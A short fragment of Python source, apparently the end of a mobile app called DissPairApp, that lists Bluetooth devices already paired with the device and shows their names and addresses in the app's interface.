        if not self.adapter: return
        try:
            for d in self.adapter.getBondedDevices().toArray():
                if d.getAddress() not in self.found_devices:
                    self.found_devices.add(d.getAddress())
                    self.add_ui_result(d.getName() or "Paired", d.getAddress(), "PAIRED")
        except: pass

if __name__ == '__main__':
    DissPairApp().run()

